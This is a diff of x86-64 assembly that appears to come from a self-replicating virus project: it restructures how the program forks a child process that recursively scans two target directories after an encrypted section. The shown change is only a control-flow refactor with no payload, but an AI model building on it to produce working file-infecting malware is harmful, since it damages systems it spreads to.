@@ -71,30 +71,19 @@ encrypted_start:
     cmp rax, 0
     jnz exit
 
-birth_of_childs:
-scan_first_dir:
-
-    mov rax, SYS_FORK
-    syscall
-    mov rax, SYS_GETPID
-    syscall
-    cmp rax, [rsp + ppid]
-    jz scan_second_dir
-
-    lea rdi, [rsp + fileName]
-    lea rsi, [rel firstDir]
-    call ft_strcpy
-    mov rdi, rsp
-    call recursive
-    jmp exit
-
-scan_second_dir:
+birth_of_child:
     mov rax, SYS_FORK
     syscall
     mov rax, SYS_GETPID
     syscall
     cmp rax, [rsp + ppid]
     jz exit
+
+    lea rdi, [rsp + fileName]
+    lea rsi, [rel firstDir]
+    call ft_strcpy
+    mov rdi, rsp
+    call recursive
 
     lea rdi, [rsp + fileName]
     lea rsi, [rel secondDir]
@@ -112,9 +101,11 @@ exit:
     pop rcx
     pop rdx
     leave
+
     cmp rax, rbx
     jnz death_of_child
     xor rax, rax
+    
 jump:
     ret
     nop
